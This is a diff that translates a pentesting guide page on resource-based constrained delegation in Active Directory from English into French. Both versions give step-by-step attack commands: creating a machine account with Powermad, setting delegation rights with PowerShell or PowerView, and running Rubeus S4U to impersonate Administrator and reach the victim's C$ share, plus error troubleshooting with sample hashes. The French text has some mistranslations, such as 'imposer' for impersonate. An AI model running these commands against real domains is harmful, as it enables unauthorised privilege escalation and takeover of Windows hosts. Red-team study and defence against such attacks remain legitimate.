@@ -1,4 +1,4 @@
-# Resource-based Constrained Delegation
+# Délégation contrainte basée sur les ressources
 
 {{#include ../../banners/hacktricks-training.md}}
 
@@ -6,47 +6,44 @@
 
 {% embed url="https://websec.nl/" %}
 
-## Basics of Resource-based Constrained Delegation
+## Concepts de base de la délégation contrainte basée sur les ressources
 
-This is similar to the basic [Constrained Delegation](constrained-delegation.md) but **instead** of giving permissions to an **object** to **impersonate any user against a service**. Resource-based Constrain Delegation **sets** in **the object who is able to impersonate any user against it**.
+C'est similaire à la [Délégation contrainte](constrained-delegation.md) de base mais **au lieu** de donner des permissions à un **objet** pour **imposer n'importe quel utilisateur contre un service**. La Délégation contrainte basée sur les ressources **définit** dans **l'objet qui peut imposer n'importe quel utilisateur contre lui**.
 
-In this case, the constrained object will have an attribute called _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ with the name of the user that can impersonate any other user against it.
+Dans ce cas, l'objet contraint aura un attribut appelé _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ avec le nom de l'utilisateur qui peut imposer n'importe quel autre utilisateur contre lui.
 
-Another important difference from this Constrained Delegation to the other delegations is that any user with **write permissions over a machine account** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) can set the _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ (In the other forms of Delegation you needed domain admin privs).
+Une autre différence importante de cette Délégation contrainte par rapport aux autres délégations est que tout utilisateur avec **des permissions d'écriture sur un compte machine** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) peut définir le _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ (Dans les autres formes de Délégation, vous aviez besoin de privilèges d'administrateur de domaine).
 
-### New Concepts
+### Nouveaux concepts
 
-Back in Constrained Delegation it was told that the **`TrustedToAuthForDelegation`** flag inside the _userAccountControl_ value of the user is needed to perform a **S4U2Self.** But that's not completely truth.\
-The reality is that even without that value, you can perform a **S4U2Self** against any user if you are a **service** (have a SPN) but, if you **have `TrustedToAuthForDelegation`** the returned TGS will be **Forwardable** and if you **don't have** that flag the returned TGS **won't** be **Forwardable**.
+Dans la Délégation contrainte, il a été dit que le **`TrustedToAuthForDelegation`** drapeau à l'intérieur de la valeur _userAccountControl_ de l'utilisateur est nécessaire pour effectuer un **S4U2Self.** Mais ce n'est pas complètement vrai.\
+La réalité est que même sans cette valeur, vous pouvez effectuer un **S4U2Self** contre n'importe quel utilisateur si vous êtes un **service** (avez un SPN) mais, si vous **avez `TrustedToAuthForDelegation`** le TGS retourné sera **Transférable** et si vous **n'avez pas** ce drapeau, le TGS retourné **ne sera pas** **Transférable**.
 
-However, if the **TGS** used in **S4U2Proxy** is **NOT Forwardable** trying to abuse a **basic Constrain Delegation** it **won't work**. But if you are trying to exploit a **Resource-Based constrain delegation, it will work** (this is not a vulnerability, it's a feature, apparently).
+Cependant, si le **TGS** utilisé dans **S4U2Proxy** **n'est PAS Transférable**, essayer d'abuser d'une **délégation contrainte de base** **ne fonctionnera pas**. Mais si vous essayez d'exploiter une **délégation contrainte basée sur les ressources, cela fonctionnera** (ce n'est pas une vulnérabilité, c'est une fonctionnalité, apparemment).
 
-### Attack structure
+### Structure de l'attaque
 
-> If you have **write equivalent privileges** over a **Computer** account you can obtain **privileged access** in that machine.
+> Si vous avez **des privilèges d'écriture équivalents** sur un **compte d'ordinateur**, vous pouvez obtenir **un accès privilégié** à cette machine.
 
-Suppose that the attacker has already **write equivalent privileges over the victim computer**.
+Supposons que l'attaquant a déjà **des privilèges d'écriture équivalents sur l'ordinateur de la victime**.
 
-1. The attacker **compromises** an account that has a **SPN** or **creates one** (“Service A”). Note that **any** _Admin User_ without any other special privilege can **create** up until 10 **Computer objects (**_**MachineAccountQuota**_**)** and set them a **SPN**. So the attacker can just create a Computer object and set a SPN.
-2. The attacker **abuses its WRITE privilege** over the victim computer (ServiceB) to configure **resource-based constrained delegation to allow ServiceA to impersonate any user** against that victim computer (ServiceB).
-3. The attacker uses Rubeus to perform a **full S4U attack** (S4U2Self and S4U2Proxy) from Service A to Service B for a user **with privileged access to Service B**.
-   1. S4U2Self (from the SPN compromised/created account): Ask for a **TGS of Administrator to me** (Not Forwardable).
-   2. S4U2Proxy: Use the **not Forwardable TGS** of the step before to ask for a **TGS** from **Administrator** to the **victim host**.
-   3. Even if you are using a not Forwardable TGS, as you are exploiting Resource-based constrained delegation, it will work.
-4. The attacker can **pass-the-ticket** and **impersonate** the user to gain **access to the victim ServiceB**.
+1. L'attaquant **compromet** un compte qui a un **SPN** ou **en crée un** (“Service A”). Notez que **tout** _Utilisateur Admin_ sans aucun autre privilège spécial peut **créer** jusqu'à 10 **objets d'ordinateur (**_**MachineAccountQuota**_**)** et leur attribuer un **SPN**. Donc, l'attaquant peut simplement créer un objet d'ordinateur et définir un SPN.
+2. L'attaquant **abuse de son privilège d'ÉCRITURE** sur l'ordinateur de la victime (ServiceB) pour configurer **la délégation contrainte basée sur les ressources pour permettre à ServiceA d'imposer n'importe quel utilisateur** contre cet ordinateur de la victime (ServiceB).
+3. L'attaquant utilise Rubeus pour effectuer une **attaque S4U complète** (S4U2Self et S4U2Proxy) de Service A à Service B pour un utilisateur **avec un accès privilégié à Service B**.
+1. S4U2Self (depuis le compte SPN compromis/créé) : Demander un **TGS d'Administrateur pour moi** (Non Transférable).
+2. S4U2Proxy : Utiliser le **TGS non Transférable** de l'étape précédente pour demander un **TGS** de **l'Administrateur** au **hôte victime**.
+3. Même si vous utilisez un TGS non Transférable, comme vous exploitez la délégation contrainte basée sur les ressources, cela fonctionnera.
+4. L'attaquant peut **passer le ticket** et **imposer** l'utilisateur pour obtenir **l'accès au ServiceB de la victime**.
 
-To check the _**MachineAccountQuota**_ of the domain you can use:
-
+Pour vérifier le _**MachineAccountQuota**_ du domaine, vous pouvez utiliser :
 ```powershell
 Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
 ```
+## Attaque
 
-## Attack
+### Création d'un objet ordinateur
 
-### Creating a Computer Object
-
-You can create a computer object inside the domain using [powermad](https://github.com/Kevin-Robertson/Powermad)**:**
-
+Vous pouvez créer un objet ordinateur dans le domaine en utilisant [powermad](https://github.com/Kevin-Robertson/Powermad)**:**
 ```powershell
 import-module powermad
 New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
@@ -54,18 +51,14 @@ New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '
 # Check if created
 Get-DomainComputer SERVICEA
 ```
+### Configuration de la R**eprésentation basée sur la délégation contrainte**
 
-### Configuring R**esource-based Constrained Delegation**
-
-**Using activedirectory PowerShell module**
-
+**Utilisation du module PowerShell activedirectory**
 ```powershell
 Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
 Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
 ```
-
-**Using powerview**
-
+**Utilisation de powerview**
 ```powershell
 $ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
 $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
@@ -80,55 +73,46 @@ msds-allowedtoactonbehalfofotheridentity
 ----------------------------------------
 {1, 0, 4, 128...}
 ```
+### Réalisation d'une attaque S4U complète
 
-### Performing a complete S4U attack
-
-First of all, we created the new Computer object with the password `123456`, so we need the hash of that password:
-
+Tout d'abord, nous avons créé le nouvel objet Ordinateur avec le mot de passe `123456`, donc nous avons besoin du hash de ce mot de passe :
 ```bash
 .\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
 ```
-
-This will print the RC4 and AES hashes for that account.\
-Now, the attack can be performed:
-
+Cela imprimera les hachages RC4 et AES pour ce compte.\
+Maintenant, l'attaque peut être effectuée :
 ```bash
 rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
 ```
-
-You can generate more tickets just asking once using the `/altservice` param of Rubeus:
-
+Vous pouvez générer plus de tickets en demandant une seule fois en utilisant le paramètre `/altservice` de Rubeus :
 ```bash
 rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
 ```
-
 > [!CAUTION]
-> Note that users has an attribute called "**Cannot be delegated**". If a user has this attribute to True, you won't be able to impersonate him . This property can be seen inside bloodhound.
+> Notez que les utilisateurs ont un attribut appelé "**Cannot be delegated**". Si un utilisateur a cet attribut à True, vous ne pourrez pas l'impliquer. Cette propriété peut être vue dans BloodHound.
 
-### Accessing
+### Accès
 
-The last command line will perform the **complete S4U attack and will inject the TGS** from Administrator to the victim host in **memory**.\
-In this example it was requested a TGS for the **CIFS** service from Administrator, so you will be able to access **C$**:
-
+La dernière ligne de commande effectuera l'**attaque S4U complète et injectera le TGS** de l'Administrateur vers l'hôte victime en **mémoire**.\
+Dans cet exemple, un TGS pour le service **CIFS** a été demandé à l'Administrateur, vous pourrez donc accéder à **C$** :
 ```bash
 ls \\victim.domain.local\C$
 ```
+### Abuser différents tickets de service
 
-### Abuse different service tickets
+Apprenez à propos des [**tickets de service disponibles ici**](silver-ticket.md#available-services).
 
-Lear about the [**available service tickets here**](silver-ticket.md#available-services).
+## Erreurs Kerberos
 
-## Kerberos Errors
+- **`KDC_ERR_ETYPE_NOTSUPP`** : Cela signifie que kerberos est configuré pour ne pas utiliser DES ou RC4 et que vous ne fournissez que le hachage RC4. Fournissez à Rubeus au moins le hachage AES256 (ou fournissez-lui simplement les hachages rc4, aes128 et aes256). Exemple : `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
+- **`KRB_AP_ERR_SKEW`** : Cela signifie que l'heure de l'ordinateur actuel est différente de celle du DC et que kerberos ne fonctionne pas correctement.
+- **`preauth_failed`** : Cela signifie que le nom d'utilisateur donné + les hachages ne fonctionnent pas pour se connecter. Vous avez peut-être oublié de mettre le "$" dans le nom d'utilisateur lors de la génération des hachages (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
+- **`KDC_ERR_BADOPTION`** : Cela peut signifier :
+  - L'utilisateur que vous essayez d'imiter ne peut pas accéder au service désiré (parce que vous ne pouvez pas l'imiter ou parce qu'il n'a pas suffisamment de privilèges)
+  - Le service demandé n'existe pas (si vous demandez un ticket pour winrm mais que winrm n'est pas en cours d'exécution)
+  - L'ordinateur fictif créé a perdu ses privilèges sur le serveur vulnérable et vous devez les lui redonner.
 
-- **`KDC_ERR_ETYPE_NOTSUPP`**: This means that kerberos is configured to not use DES or RC4 and you are supplying just the RC4 hash. Supply to Rubeus at least the AES256 hash (or just supply it the rc4, aes128 and aes256 hashes). Example: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
-- **`KRB_AP_ERR_SKEW`**: This means that the time of the current computer is different from the one of the DC and kerberos is not working properly.
-- **`preauth_failed`**: This means that the given username + hashes aren't working to login. You may have forgotten to put the "$" inside the username when generating the hashes (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
-- **`KDC_ERR_BADOPTION`**: This may mean:
-  - The user you are trying to impersonate cannot access the desired service (because you cannot impersonate it or because it doesn't have enough privileges)
-  - The asked service doesn't exist (if you ask for a ticket for winrm but winrm isn't running)
-  - The fakecomputer created has lost it's privileges over the vulnerable server and you need to given them back.
-
-## References
+## Références
 
 - [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
 - [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
@@ -140,4 +124,3 @@ Lear about the [**available service tickets here**](silver-ticket.md#available-s
 {% embed url="https://websec.nl/" %}
 
 {{#include ../../banners/hacktricks-training.md}}
-
